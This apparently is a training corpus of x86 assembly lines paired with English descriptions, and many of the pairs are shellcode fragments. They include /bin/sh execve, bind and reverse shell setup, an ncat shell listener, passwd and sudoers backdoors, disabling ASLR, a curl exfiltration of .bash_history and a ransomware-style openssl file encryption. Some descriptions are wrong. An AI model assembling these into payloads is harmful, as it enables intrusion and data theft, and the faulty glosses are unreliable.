mov ecx,esp	ecx points to the arguments adress
mov ecx,esp	save pointer into ecx
mov ecx,esp	ecx point to the top of he stack
mov ecx,esp	save esp content into ecx regoster
mov ecx,esp \n mov ecx,esp \n mov ebx,esp	transfer esp content into ecx two times and in ebx
mov edi, [ebp+16]	move value the contents of memory address ebp+16 into edi
mov edi, 0x343997b7	move 0x343997b7 into edi
mov edi, 0x3734b117	move 0x3734b117 into edi
mov edi, 0x6e69622f	push /bin in edi
mov edi, 0x978cd092	move 0x978cd092 into edi
mov edi, 0x978cd092 \n mov ebx, edi	load hexadecimal value 0x978cd092 into edi and ebx registers
mov edi, 0x978cd0d0	move 0x978cd0d0 into edi
mov edi, 0x978cd0d0 \n mov esi, 0x91969dd0 \n not edi \n not esi \n push edi \n push esi	push ‘/bin//sh on stack’
mov edi, 0xaaaa9090	move 0xaaaa9090 to edi
mov edi, 0xada67373	trtasfer the hexadecimal value 0xada67373 into edi register
mov edi, 0xada67373	move 0xada67373 into edi
mov edi, 876189623	move 876189623 into edi
mov edi, 884021143	move 884021143 into edi
mov edi, eax	copy eax content into edi register
mov edi, eax	move eax into edi
mov edi, eax	move the return value of sys_socketcall into edi
mov edi, ecx	move ecx to edi for scasd operation
mov edi, ecx	move ecx content to edi register
mov edi, ecx	copy ecx content in edi register
mov edi, ecx	move ecx to edi
mov edi, ecx	move ecx into edi
mov edi, edx	move edx into edi
mov edi, edx	move the remainder into edi
mov edi, esi	copy esi content into esi register
mov edi, esi	move encoded_shellcode pointer to edi
mov edi, esi	move esi into edi
mov edi, esi	move the pointer to the shellcode into edi
mov edi, esp	load esp content in edi register
mov edi, esp	save addr of stack into edi
mov edi, esp	edi points to the top of the stack
mov edi, esp	moving the pointer to the string ‘-le//bin//sh’ to edi
mov edi, esp	move esp into edi
mov edi, hexstr	place hexstr into edi
mov edi,0x3734b117	move hexadecimal value 0x3734b117 into edi content
mov edi,0x6e69622f	load the string /bin into edi register
mov edi,0x79844040 \n sub edi,0x11111111	load the string //sh into edi register
mov edi,ecx	load the current address from ecx to edi
mov edi,esp	load esp content into edi register
mov edi,esp	point edi to stack
mov edi,esp	save in edi the -c value
mov edx, [esi+4*ebx]	move the 4 bytes of data at address esi+4*ebx into edx
mov edx, [esp]	saves stage address to edx
mov edx, [esp]	move the contents of the esp register into the edx register
mov edx, [temp4]	move the contents at memory address temp4 to edx
mov edx, [z]	move the contents at memory address z to edx
mov edx, 0x1234567	loading the cmd argument: linux_reboot_cmd_restart in edx
mov edx, 0x1234567	move the value 0x1234567 into the edx register
mov edx, 1	move 1 into edx
mov edx, 11	move integer 11 to edx
mov edx, 12	move 12 to edx
mov edx, 13	move 13 into edx
mov edx, 2	move decimal 2 into edx
mov edx, 255	move decimal number 255 into edx
mov edx, 3	move 3 decimal into edx
mov edx, 43	move 43 decimal into edx
mov edx, 43	move decimal 43 into edx
mov edx, 66729180	move 66729180 into edx
mov edx, 78	move decimal 78 into edx
mov edx, 78	store 78 decimal into edx
mov edx, 8	move 8 decimal into edx
mov edx, 8	put 8 into edx
mov edx, 9	move number 9 into edx
mov edx, buff	move buff to edx
mov edx, bufflen	move bufflen into edx
mov edx, donelen	move donelen into edx
mov edx, dword 0x65676760	save ‘egg’ into edx register
mov edx, dword 0x65676760	move dword 0x65676760 into edx
mov edx, dword 0x65676760	move the doubleword 0x65676760 into edx
mov edx, eatlen	move eatlen into edx
mov edx, eax	copy eax content into edx
mov edx, eax	copy eax into edx
mov edx, eax	save the fd from the socket
mov edx, eax	save the socket fd contained into eax in edx
mov edx, eax	move eax into edx
mov edx, eax	backup eax into edx
mov edx, ebp	move ebp into edx
mov edx, ecx	set zero to edx
mov edx, ecx	move ecx into edx
mov edx, ecx	move ecx to edx
mov edx, egg_sig	set edx = 0x4f904790edx = 0x4f904790
mov edx, environment	move the address of environment variable into edx
mov edx, esi	move esi into edx
mov edx, esp	load the stack pointer on edx regsiter
mov edx, esp	save addr of stack into edx
mov edx, esp	get a pointer to the null value saving it in edx register
mov edx, esp	load stack pointer into edx register
mov edx, esp	save esp content into edx
mov edx, esp	moving 0 to edx
mov edx, esp	gets the memory address of the nulls onto the stack into edx
mov edx, esp	move esp into edx
mov edx, esp	move the contents of the esp register into the edx register
mov edx, esp	move address of stack pointer into edx
mov edx, esp	point edx to the stack pointer
mov edx, esp	move the stack pointer into edx
mov edx, filename	move filename into edx
mov edx, hellolen	move hellolen into edx
mov edx, hexlen	move hexlen into edx
mov edx, len	move variable len to edx
mov edx, m_src4	move m_src4 to edx
mov edx, n	move n to edx
mov edx, readbuffer	move readbuffer into edx
mov edx, readlen	move readlen into edx
mov edx, response	move address of response variable into edx
mov edx, src	move the contents of src variable into edx
mov edx, tmp	move the contents of tmp variable into edx
mov edx, type var1	move the number of bytes of var1 into edx
mov edx,0x4f904790	copy the hexadecimal value of “.g.o” into ed register
mov edx,eax	copy eax content into edx register
mov edx,esp	load the stack pointer into edx register
mov edx,esp	load esp cpntent into edx register
mov edx,esp	move stack pointer into edx
mov edx,esp	load esp content into edx register
mov esi , esp	load the stack pointer into esi register
mov esi, [ebp+12]	move the contents of memory address ebp+12 into esi
mov esi, 0x222933f0	move 0x222933f0 into esi
mov esi, 0x243525f0	move 0x243525f0 into esi
mov esi, 0x34399797	move 0x34399797 into esi
mov esi, 0x353ffc3b	transfer hexadecimal value 0x353ffc3b into esi regsiter
mov esi, 0x353ffc3b	move 0x353ffc3b into esi
mov esi, 0x563a1f3e	move 0x563a1f3e into esi
mov esi, 0x65636170	move 0x65636170 into esi
mov esi, 0x65636170 \n push esi \n xor esi, esi \n mov esi, 0x735f6176 \n push esi \n xor esi, esi \n push dword 0x5f657a69 \n push dword 0x6d6f646e \n push dword 0x61722f6c \n push dword 0x656e7265 \n push dword 0x6b2f7379 \n push dword 0x732f636f \n mov esi, 0x72702f2f \n push esi \n xor esi, esi \n mov ebx,esp	push the string //proc/sys/kernel/randomize_va_space on the stack and then load the stack pointer on ebx register
mov esi, 0x68732f2f	push //sh in esi
mov esi, 0x68732f2f	move 0x68732f2f into esi
mov esi, 0x72702f2f	move 0x72702f2f into esi
mov esi, 0x735f6176	move 0x735f6176 into esi
mov esi, 0x91969dd0	move 0x91969dd0 into esi
mov esi, 0xd2c45e5e	move 0xd2c45e5e into esi
mov esi, 10	move 10 into esi
mov esi, 9	move 9 into esi
mov esi, buff	place address buff into esi
mov esi, eax	save returned file descriptor from eax into esi
mov esi, eax	save eax contents in esi contents
mov esi, eax	save socket file descriptor from eax into esi
mov esi, eax	transfer eax content into esi register
mov esi, eax	transfer fd for next call from eax into esi register
mov esi, eax	copy eax content in esi register
mov esi, eax	copy eax to esi content
mov esi, eax	store sockfd in esi register
mov esi, eax	store socket descriptor into esi register
mov esi, eax	save eax content into esi
mov esi, eax	save the newly created socket from eax to esi
mov esi, eax	move pointer in eax into esi
mov esi, eax	move eax into esi
mov esi, eax \n xor eax, eax	copy socket des from eax to esi register then clear eax
mov esi, ecx	copy ecx into esi register
mov esi, ecx	move ecx into esi
mov esi, edx	move remainder into esi
mov esi, esp	load in esi the pointer to ‘-f’ argument
mov esi, esp	load esp contents on esi register
mov esi, esp	load the the stack pointer in esi register
mov esi, esp	load esp content in esi regsister
mov esi, esp	save addr of stack into esi
mov esi, esp	save the name of the file into esi register
mov esi, esp	moving the pointer to ‘-vp13337’to esi
mov esi, esp	save esp content into esi register
mov esi, esp	move esp into esi
mov esi, v	move v to esi
mov esi, v_src	move v_src to esi
mov esi, var	copy the address of var into esi
mov esi,0x34399797	move hexadecimal value 0x34399797 into esi content
mov esi,eax	move the socket file descriptor from eax to esi
mov esi,eax	saves socket descriptor from eax into esi regsiter
mov esi,eax	save the socket descriptor stored in eax in esi
mov esp, ebp	move the contents of the ebp register ino the esp register
mov esp, ebp	move the contents of the ebp register into the esp register
mov esp,0x1cd9faf7	copy 0x1cd9faf7 into esp content
mov long [esi+18], esi	move the contents of the esi register into the long starting at the address [esi+18]
mov long [esi+22], ebx	move the contents of the ebx register into the long starting at the address [esi+22]
mov long [esi+22], esi	move the contents of the esi register into the long starting at the address [esi+22]
mov long [esi+26], eax	move the contents of the eax register into the long starting at the address [esi+26]
mov long [esi+26], ebx	move the contents of the ebx register into the long starting at the address [esi+26]
mov long [esi+30], eax	move the contents of the eax register into the long starting at the address [esi+30]
mov rcx, 0x68732f2f6e69622f	move the immediate value /bin//sh in hex in rcx
mov sock_reg, eax	move eax into sock_reg
mov total, 48	transfer the value 48 in the memory variable total
mov word [ebx], 2	move the 16-bit integer representation of 2 into the 2 bytes starting at the address in ebx
mov word [ecx], 2	move the 16-bit integer representation of 2 into the 2 bytes starting at address ecx
mov word [edi], ax	move ax into the word in edi
mov word [esp+0x1], 0x776f	move 0x776f into the word in [esp+0x1]
mov word ptr [edi-0x69622f69],ss	copy ss content into the word at the adress edi-0x69622f69
mov x, eax	move eax to x variable
mov[esi+13], al	null terminate /usr/bin/ncat
mov[esi+22], al	null terminate -lvp1337
mov[esi+34], al	null terminate -e/bin/bash
mov[esi+35], esi	store address of /usr/bin/ncat in aaaa
mov[esi+39], ebx	store address of -lvp1337 in bbbb taken from ebx
mov[esi+43], ebx	store address of -e/bin/bash in cccc taken from ebx
mov[esi+47], eax	zero out dddd
move ecx, edx	backup edx into ecx
movq mm0, qword [edi]	move the 64 bit of edi into mm0 64bit register
movq mm0, qword [edi]	"move 8bytes of ""xor_value"" to mm0"
movq mm1, qword [esi]	move the 64 bit of esi into mm1 64bit register
movq mm1, qword [esi]	"move 8bytes of ""shellcode"" to mm1"
movq mm2, qword [edi]	"move 8bytes of ""rot_value"" to mm2"
movq mm3, qword [esi]	"move 8bytes of ""shellcode"" to mm3"
movq qword [esi], mm0	transfer the 64 bit of mm0 register to the 64bit register esi
movq qword [esi], mm0	"overwrite the ""shellcode"" with previous results"
movq qword [esi], mm3	"overwrite the ""shellcode"" with previous results"
mp short call_decoder	perform a short unconditional jump to call_decoder
msg db 'curl http://localhost:8080 -d 'data='$(cat .bash_history | base64 -w 0) -x post', 0x0a	define msg as the byte string 'curl http://localhost:8080 -d 'data='$(cat .bash_history | base64 -w 0) -x post'
msg db 'hello, world!', 0xa	declare msg string containing 'hello world!'
msg db 'i love you!', 0ah	define msg variable and initialize with 'i love you!'
msg db 'mv test.txt .test.txt && head -c 32 /dev/urandom | base64 | openssl aes-256-cbc -e -in .test.txt -out test.txt -pbkdf2 -k - && rm .test.txt', 0x0a	define msg as the byte string 'mv test.txt .test.txt && head -c 32 /dev/urandom | base64 | openssl aes-256-cbc -e -in .test.txt -out test.txt -pbkdf2 -k - && rm .test.txt'
msg db 'we found the egg!', 0ah, 0dh	define msg as the byte string 'we found the egg!'
msg_len equ $-msg	define msg_len equal to the length of msg
msg1 db 'hello, brave new world!', 0ah	declare message string msg1 containing 'hello brave new world!'
msg2 db 'passwd', 0x00	define msg2 as the byte string 'passwd'
msg2 db 'this is how we recycle in nasm.', 0ah	declare message string msg2 containing 'this is how we recycle in nasm'
msglength: equ 12	declare msglength to have the constant value 12
mul [tmp]	multiply the contents of eax by the 32-bit contents of the memory location tmp
mul [value]	multiply the contents of eax by the 32-bit contents of the memory location value
mul [var]	multiply the contents of eax by the 32-bit contents of the memory location var
mul 0x10	multiply eax by 0x10 and stores the result in edx:eax
mul 25	multiply the contents of eax by 25
mul 3	multiply the contents of eax by 3
mul ebx	xoring eax and edx
mul ebx	zero out eax register
mul ebx	clear eax
mul ebx	multiply the contents of eax by ebx
mul ebx	multiply the contents of the eax register by the contents of the ebx register
mul ebx	multiply eax by ebx
mul ebx	multiply eax by the contents of the ebx register
mul ebx	mul eax by ebx
mul ecx	multiply by ecx, zero out eax and edx
mul ecx	mutliply eax by 0
mul ecx	clear eax
mul ecx	mul eax by ecx
mul ecx	multiply eax by the contents of the ecx register
mul ecx	mutliply eax by ecx
mul ecx	multiply eax by ecx
mul edx	multiply edx with eax saving the result in eax
mul edx	multiply eax by the contents of the edx register
mul edx	mul eax by edx
mul edx	multiply eax by edx
my_table times 10 dw 0	allocate 10 words each initialized to 0
my_table times 10 dw 0	allocate my_table vector of 10 words each initialized to 0
my_var dw 0abcdh	define my_var word variable and initialize it to 0abcdh
myList word 1,2,3,4,5	define myList array of word and initialize it to 1, 2, 3, 4, and 5
name db '/bin/sh', 0	define name as the byte string '/bin/sh'
name db 30 dup	allocate memory for 30 bytes uninitialized name variable
neg eax	negate eax
neg eax	negate the contents of eax
neg eax	replaces the contents of the eax register with its two's complement
neg ebx	replaces the contents of the ebx register with its two's complement
neg ecx	replaces the contents of the ecx register with its two's complement
neg edi	performs the two's complement negation of the edi contents.
neg edi	negate edi
neg edi	replaces the contents of the edi register with its two's complement
neg edx	replaces the contents of the edx register with its two's complement
neg var	negate the contents of var
neg_number dw -12345	define the variable neg_number of words and initialize it to -12345
negative:	define negative label
negative: \n not dl \n inc dl	in the negative function negate dl and increment dl to the next byte
next_addr:	define next_aaddr label
next_addr:	define _next_addr label
next_addr:	define next_addr label
next_addr:	declare next_addr function
next_addr:	declare the next_addr label
next_cycle:	declare the next_cycle label
next_cycle:	define next_cycle label
next_cycle: \n inc edi \n jmp short formatting	in next_cycle increment edi by one and jump short to formatting
next_page:	define next_page label
next_page:	declare next_page function
next:	define _next label
next:	declare the next label
nop	no operation
nop	run no operation
nop	execute no operation
nop	do no operation
nop	do nothing
not ax	negate all the bits of ax register
not ax	negate all the bits of the ax register
not byte [edi]	one's complement negation of the byte edi in memory
not byte [esi]	one's complement negation of the byte esi in memory
not byte [esi]	perform a bit-wise inversion of the byte starting at the address in esi
not byte [esi]	not operation of current byte in esi
not byte [tmp]	negate all bits in the byte at the memory location tmp
not byte [var]	negate all bits in the byte at the memory location var
not byte [var2]	negate all bits in the byte at the memory location var2
not byte ptr [esi]	negate all bits in the byte contained into esi regsiter
not dl	negate all the bits of dl register
not dword ptr [esi+0x73]	negate all bits of th souble word stored at the adress esi+0x73
not eax	negate all the bits of the eax register
not ecx	negate all the bits of ecx register
not ecx	negate all the bits of the ecx register
not edi	negate all bits of edi register
not edi	negate all the bits of the edi register
not edx	perform a bit-wise inversion of edx
not esi	negate all the bits of the esi register
not word ax	negate all bits in the word contained into ax regsiter
not word ax	negate all the bits of the word at the address ax
not_equal:	not_equal label
notdecode:	declare _notdecode label
notdecode:	notdecode function
number dw 12345	define number variable of a word and initialize to 12345
number: resb 1	reserve 1 byte for number variable
numbers dw 34, 45, 56, 67, 75, 89	declare an array of six words each initialized with the numbers 34 45 56 67 75 89
odd_number:	declare odd_numer function
odd_number:	define odd_number
one:	define one_label
one:	define _one label
one:	declare the one label
one:	declare one label
open:	define open_label
or al, bl	perform or operation between al and bl registers
or al, syscall_execve	load execve in eax
or al, syscall_execve	perform or operation between the al register and syscall_execve
or al,0x78	oring hexadecimal value 0x78 to al register
or cx, 0xfff	align page address
or cx, 0xfff	perform logical or between the cx register and 0xfff
or dx, 0xfff	oring hexadecimal value 0xfff with dx register
or dx, 0xfff	perform or operation between dx and 0xfff and save the result into dx
or eax, 0xffffffff	perform the or operation between the eax register and 0xffffffff
or eax, 0xffffffff \n not eax \n push eax	move the value -1 in eax register then do the one's complement negation of eax end then push it on the stack
or ebp,dword ptr [edx-0x557f5533]	oring the double word at the adress edx-0x557f5533 wth ebp content
output:	define _output string
output:	declare the output label
path db '//bin/sh'	define path as the byte string '//bin/sh'
path db '//bin/sh'	define the byte string path and initialize it to '//bin/sh'
path:	declare the path label
pop [eax]	pop the top element of the stack into memory at the four bytes starting at location eax
pop [ebx]	pop the top element of the stack into memory at the four bytes starting at location ebx
pop ax	pop the last element pushed onto the stack into ax
pop bx	pop the last element pushed onto the stack into bx
pop cx	pop the last element pushed onto the stack into cx
pop cx	pop the value on the stack back into cx
pop cx	restore the top of the stack into the cx register
pop dx	pop the value on the stack back into dx
pop dx	restore the top of the stack into the dx register
pop eax	put syscall value into eax
pop eax	pick up eax from the stack
pop eax	pop eax from stack
pop eax	pick up eax content from the stack
pop eax	pick up eax content from stack
pop eax	pop 102 into eax
pop eax	pop the value on the stack back into eax
pop eax	restore eax from the value we pushed onto the stack at the start
pop eax	restore the original value of eax
pop eax	restore the top of the stack into eax register
pop eax	restore the top of the stack into the eax register
pop eax	pop the top of the stack into the eax register
pop eax	remove last character from the stack into edx
pop eax	pop the next argument off the stack into eax
pop eax	remove last character from the stack into eax
pop ebp	restore ebp register
pop ebp	restore the top of the stack into the ebp register
pop ebx	pick up ebx contents from the top of the stack
pop ebx	pick up ebx register from the stack
pop ebx	pick up ebx content from the register
pop ebx	pick up ebx content from the stack
pop ebx	pick up ebx content from stack
pop ebx	pick up ebx from stack
pop ebx	pop stack(2 = sys_bind = bind()) into ebx
pop ebx	load string into rbx register
pop ebx	set sys_bind = 2
pop ebx	save the string ‘ /bin/sh’ into ebx
pop ebx	save the byte string ‘mt.txtx’ into ebx register
pop ebx	save th byte string '/proc/sys/kernel/randomize_va_spacex' into ebx register
pop ebx	restore ebx from the value we pushed onto the stack at the start
pop ebx	restore the original value of ebx
pop ebx	restore the top of the stack into ebx register
pop ebx	restore the top of the stack into the ebx register
pop ebx	remove last character from the stack into ebx
pop ebx	pop the value on the stack back into ebx
pop ecx	extract ecx from the stack
pop ecx	pick up ecx contents from the stack
pop ecx	pick up ecx register from the stack
pop ecx	pick up _ecx label from the satck
pop ecx	pick up ecx content from stack
pop ecx	pick up ecx from stack
pop ecx	piack up ecx content from stack
pop ecx	"pick uo ""all all=(all) nopasswd: all"" stored i ecx from stack"
pop ecx	pick up ecx content from the stack
pop ecx	pop 3 into ecx for counter
pop ecx	get the command string to write in the file, 3rd arg
pop ecx	save addr ptr into ecx
pop ecx	remove last character from the stack into ecx
pop ecx	restore ecx from the value we pushed onto the stack at the start
pop ecx	restore ecx register
pop ecx	pop the value on the stack back into ecx
pop ecx	restore the top of the stack into the ecx register
pop ecx \n loop l1 \n mov eax, 1	restore the top of the stack into the ecx register then decrement the ecx register and jump to the l1 label if the contents of the ecx register is not zero else make the system call exit
pop ecx \n loop l2 \n mov eax, 1	restore the top of the stack into the ecx register then decrement the ecx register and jump to the l2 label if the contents of the ecx register is not zero else make the system call exit
pop ecx \n loop l3 \n mov eax, 1	restore the top of the stack into the ecx register then decrement the ecx register and jump to the l3 label if the contents of the ecx register is not zero else make the system call exit
pop ecx \n mov ebp, ecx	pick up ecx content from the stack and put it in ebp register
pop ecx \n mov edi, ecx	pick up ecx register from the stak and put its content into edi register
pop ecx \n pop ebx	pick up ecx and ebx from stack
pop edi	make edi register point to xor_value
pop edi	pick up edi content from the stack
pop edi	pick up edi content from stack
pop edi	pop the top element of the stack into edi
pop edi	restore the top of the stack into the edi register
pop edx	pop edx from stack
pop edx	pick up edx content from stack
pop edx	save fd
pop edx	restore edx from the value we pushed onto the stack at the start
pop edx	restore the top of the stack into edx register
pop edx	restore the top of the stack into the edx register
pop edx	pop the top of the stack into the edx register
pop edx	pop the value on the stack back into edx
pop edx \n pop esi \n pop edi \n pop edi	pick up edx, esi, edi x2 from the stack
pop esi	extract esi from the stack
pop esi	transfer word at the current stack top to esi
pop esi	pick up esi register content from the stack
pop esi	pick up esi content fro the stack
pop esi	pick up esi content from stack
pop esi	pick up esi from the stack
pop esi	pick up esi register from the stack
pop esi	pick up esi register that contains the string in db
pop esi	piack up esi content from the stack
pop esi	pop the shellcode address from esi register
pop esi	store encoded_shellcode pointer in esi
pop esi	pop stack(1) into esi
pop esi	address of string -> esi
pop esi	pop the value on the top of the stack into esi
pop esi	pop esi content
pop esi	save shellcode into esi
pop esi	save shellcode address into esi register
pop esi	restore esi from the stack
pop esi	restore esi from the value we pushed onto the stack at the start
pop esi	restore the top of the stack into esi register
pop esi	restore the top of the stack into the esi register
pop esi	pop the top of the stack into the esi register
pop esi	pop the value on the stack back into esi
pop esi	get the address of shellcode
pop esi	load address of the encoded shellcode into esi
pop esi	pop the shellcode into esi
pop esi	pop the address of the encoded shellcode into esi
pop esi	shellcode address in esi
pop esi	shellcode on esi
pop esi	store the address of the shellcode in esi
pop esi	store the pointer to the encoded shellcode in esi
pop esi	store the shellcode in esi
pop esi	store the shellcode pointer to esi
pop esi	save the shellcode in the esi register
pop esi	load the shellcode in esi
pop esi	encoded shellcode in esi
pop esi	save the address of the shellcode in esi
pop esi	pop the address of the shellcode in the esi register
pop esi	store the pointer to the shellcode into esi
pop esi \n mov ax, [esi]	store the shellcode in the esi register and copy it into ax
pop esi \n mov bx, [esi]	save the encoded shellcode in esi and move it into bx
pop esi \n mov cx, [esi]	store the shellcode in esi and move it into cx
pop esi \n mov cx, [esi]	point esi to the shellcode and save it into cx
pop esi \n mov dx, [esi]	pop the shellcode in esi and save it into dx
pop esi \n push esi	transfer word at the current stack top to esi and then push esi on the stack
pop esp	restore the top of the stack into the esp register
pop si	restore the top of the stack into the si register
popad	extract the data for the 8 general-purpose 32-bit registers from the stack
popad	move doublewords from the stack into the 32 bit registers
popad	move doublewords from the stack into the general purpose registers
popad	pop doublewords from the stack into the 32 bit registers
popad	pop doublewords from the stack into the general purpose registers
port: db 0xd4, 0x31, 0xc0, 0xa8, 0x3, 0x77	define port array of 5 bytes and initialize it to 0xd4, 0x31, 0xc0, 0xa8, 0x3, 0x77
port: db 0xd4, 0x31, 0xc0, 0xa8, 0x3, 0x77	define port as an array of bytes and initialize it to 0xd4, 0x31, 0xc0, 0xa8, 0x3, 0x77
prepare:	define _ prepare label
prepare:	declare the prepare label
priv_setgid:	define _ priv_setgid label
priv_setgid:	declare the priv_setgid label
priv_setuid:	define :_priv_setuid label
priv_setuid:	declare the priv_setuid label
process_shellcode:	define prcess_shellcode label
process_shellcode:	declare the process_shellcode label
psubb mm3, mm2	"subtract 13 from ""shellcode"""
push _ip	push ip address as _ip on stack
push _ip	push _ip onto the stack
push '//pa'	push '//pa' onto the stack
push '//sh'	push '//sh' onto the stack
push '/bin'	push '/bin' onto the stack
push '/etc'	push '/etc' onto the stack
push 'sswd'	push 'sswd' onto the stack
"push ""sswd"" \n push ""//pa"" \n push ""/etc"""	push ‘/etc//passwd’ on stack
push [tmp]	push the 4 bytes at address tmp onto stack
push [var]	push the 4 bytes at address var onto the stack
push [var2]	push the 4 bytes at address var2 onto the stack
push 0bh	push 0bh onto the stack
push 0x0	push the value 0x0 to the stack
push 0x0	push 0x0 onto the stack
push 0x0 \n push ecx \n push ebx	push the value 0x0, ecx and ebx contents on stack
push 0x0 \n push ecx \n push ebx \n mov ecx,esp	load ‘/bin/cat/etc//paswd\0’ into ex register
push 0x0068732f \n push 0x6e69622f \n mov ebx, esp	save /bin/sh in the first free 32bit register
push 0x0101017f \n push word 0x5c11 \n push word 0x02 \n mov ecx, esp	save the address 127.1.1.1, the value on 32bit 4444 and af_inet represented in 32bit on ecx register
push 0x04020a0a	push ip adress 0x04020a0a
push 0x04020a0a	push 0x04020a0a onto the stack
push 0x0a206873	push 0x0a206873 onto the stack
push 0x0a206873 \n push 0x2f6e6962 \n push 0x2f3a706d \n push 0x742f3a31 \n push 0x3131313a \n push 0x31313131 \n push 0x3a30754a \n push 0x4c5a304b \n push 0x45683933 \n push 0x78534a52 \n push 0x50446862 \n push 0x73644d24 \n push 0x67513231 \n push 0x3458652e \n push 0x2431243a \n push 0x64687373 \n mov ebp, esp	load the string sshd:$1$.ex412qg$mdsbhdprjsx39hek0zlju0:1111:1111:/tmp:/bin/sh on ebp register
push 0x0a3a7964	push 0x0a3a7964 onto the stack
push 0x0a3a7964 \n push 0x72706475 \n mov edx, esp	load ‘udprdy:’ into edx register
push 0x0a4c4c41	push the value 0x0a4c4c41 onto the stack
push 0x0a4c4c41	push 0x0a4c4c41 onto the stack
push 0x0b \n pop eax	insert the hexadecimal value 11 on the stack and save it in the first free 32bit register
push 0x1	push hexadecimal value 0x1 on stack
push 0x1	push socket_type = sock_stream, 1, on stack
push 0x1	push socket_type = sock_stream = 1 on stack
push 0x1	push 1 onto the stack for sock_stream
push 0x1	set the sol_socket onto the stack
push 0x1	push the value 0x1 onto the stack
push 0x1	push 0x1 to the stack
push 0x1	push 0x1 onto the stack
push 0x1 \n pop eax	load exit syscall number into eac register
push 0x1 \n pop eax	load exit syscall number into eax register
push 0x1 \n pop ebx	load sys_socket = 1 intp ebx
push 0x1 \n push ecx \n push esi	push 16, ecx and esi on the stack
push 0x10	push the size of v4lhost on stack
push 0x10	push lenght of adress 0x10 on stacik
push 0x10	push addrlen = 0x10 on stack
push 0x10	addr leght 16
push 0x10	define the size of inet_address = 16 (hex)
push 0x10	push on stack the size of sock_ad = 16 (hex)
push 0x10	push 0x10 onto the stack
push 0x10	push 0x10 to the stack
push 0x10	push the 0x10 onto the stack
push 0x10	push the value 0x10 onto the stack
push 0x10 \n push ecx	push the hexadecimal value 10 and ecx content on the stack.
push 0x10 \n push ecx \n push edi \n mov ecx,esp	push the hexadecimal value 10, ecx content and edi content on the stack. then load the stack pointer into ecx register.
push 0x10 \n push ecx \n push edx	push the sizeof(struct sockaddr_in), &serv_addr and the sockfd on stack
push 0x10 \n push ecx \n push esi	push the value 0x10, ecx content and esi content on stack
push 0x10 \n push ecx \n push esi	push hexadecimal value 0x10, ecx and esi contents on stack
push 0x10 \n push ecx \n push esi \n mov ecx, esp	save 16, ecx contents and the saved socket descriptor (in esi) on ecx
push 0x10 \n push ecx \n push esi \n mov ecx, esp	save the hexadecimal value 16, ecx contents and esi contents in ecx
push 0x101017f	push the hexadecimal value 0x101017f of ip adress on stack
push 0x101017f	push ip adreess as hexadecimal value 0x101017f on stack
push 0x14	load hexadecimal value 0x14 on edx register
push 0x14 \n pop edx	load hexadecimal value 0x14 on edx register
push 0x16	set the sockaddr size, 0x16, onto the stack
push 0x16	push the value 0x16 onto the stack
push 0x1a	push the value 0x1a onto the stack
push 0x1a	push the value 0x1a to the stack
push 0x1c	push the size of struct on stack
push 0x1c	push the value 0x1c onto the stack
push 0x1c	push the value 0x1c to the stack
push 0x1c \n push ecx \n push esi	push hexadecimal value 0x1c, ecx and esi contents on stack
push 0x1ff9090 \n pop ecx	load hexadecimal value 0x1ff9090 into ecx then shift right its bits 0x10 times
push 0x1ff9090 \n pop ecx	load hexadecimal value 0x1ff9090 into ecx
push 0x2	push the value 2 on the stack
push 0x2	push af_inet = 2 on stack
push 0x2	push 2 on stack
push 0x2	value 0x2 is pushed onto stack (af_inet=2)
push 0x2	push 2 onto the stack for af_inet
push 0x2	set the so_reuseaddr onto the stack
push 0x2	push 0x2 onto the stack
push 0x2	push 0x2 to the stack
push 0x2	push the 0x2 onto the stack
push 0x2 \n mov ecx, esp \n int 0x80	load 0x2 into ecx register and call kernel
push 0x2 \n pop ecx	load the value 0x2 into ecx register
push 0x2 \n push edx \n push 0x1a \n push 0x29	push the size of no=2, the pointer to no, the argument ipv6_v6only=26 and the argument ipproto=ipv6 = 41 on stack
push 0x203a4457	push the 0x203a4457 onto the stack
push 0x203a4457	push 0x203a4457 onto the stack
push 0x204c4c41	push 0x204c4c41 onto the stack
push 0x204c4c41	push the 0x204c4c41 onto the stack
push 0x2431243a	push 0x2431243a onto the stack
push 0x29	push the value 0x29 to the stack
push 0x29	push 0x29 onto the stack
push 0x2e312e31	push 0x2e312e31 onto the stack
push 0x2e312e31	push the value 0x2e312e31 to the stack
push 0x2e323931	push the value 0x2e323931 onto the stack
push 0x2e323931	push 0x2e323931 to the stack
push 0x2e373231	push 0x2e373231 to the stack
push 0x2e373231	push 0x2e373231 onto the stack
push 0x2e383631	push the value 0x2e383631 onto the stack
push 0x2e383631	push 0x2e383631 to the stack
push 0x2f2f2f2f	push '////' on stack
push 0x2f2f2f2f	push 0x2f2f2f2f onto the stack
push 0x2f2f2f2f	push 0x2f2f2f2f to the stack
push 0x2f2f2f2f	push the 0x2f2f2f2f onto the stack
push 0x2f2f2f2f \n mov eax, esp	push the value 0x2f2f2f2f onto the stack and point eax to the stack register
push 0x2f2f2f2f \n mov ebx, esp	push the value 0x2f2f2f2f onto the stack and point ebx to the stack register
push 0x2f2f2f2f \n mov ecx, esp	push the value 0x2f2f2f2f onto the stack and point ecx to the stack register
push 0x2f2f2f2f \n mov edi, esp	push the value 0x2f2f2f2f onto the stack and point edi to the stack register
push 0x2f2f2f2f \n mov edx, esp	push the value 0x2f2f2f2f onto the stack and point edx to the stack register
push 0x2f2f2f2f \n mov esi, esp	push the value 0x2f2f2f2f onto the stack and point esi to the stack register
push 0x2f2f2f6e	push the 0x2f2f2f6e onto the stack
push 0x2f3a706d	push 0x2f3a706d onto the stack
push 0x2f3a746f	push 0x2f3a746f onto the stack
push 0x2f656c2d	push 0x2f656c2d onto the stack
push 0x2f656c2d	push the 0x2f656c2d onto the stack
push 0x2f6e6962	push '/nib' on stack
push 0x2f6e6962	push 0x2f6e6962 to the stack
push 0x2f6e6962	push 0x2f6e6962 onto the stack
push 0x2faa2faa	push hexadecimal value 0x2faa2faa on stack
push 0x2faa68aa	push hexadecimal value 0x2faa68aa on stack
push 0x3 \n pop ebx	load the command sys_connect = 3 into ebx register
push 0x30	push the value 0x30 onto the stack
push 0x30 \n pop eax	push 48 on the stack and put this value in eax, taking it from the stack
push 0x30313a31	push 0x30313a31 to the stack
push 0x30313a31	push 0x30313a31 onto the stack
push 0x30313a31 \n push 0x2e312e31 \n push 0x2e373231 \n mov esi, esp \n push eax \n push 0x79616c70 \n push 0x7369642d \n mov edi,esp \n push eax \n push 0x6d726574 \n push 0x782f6e69 \n push 0x622f7273 \n push 0x752f2f2f \n mov ebx,esp \n push eax \n push esi \n push edi \n push ebx	push on stack the listening ip 127.1.1.1:10 and save it into esi register then push null and ‘- display’ command and save it in edi register. subsequently push null and the string ‘///usr/bin/xterm’ and save it into ebx register. in the end push eax, esi, edi and ebx on sta stack.
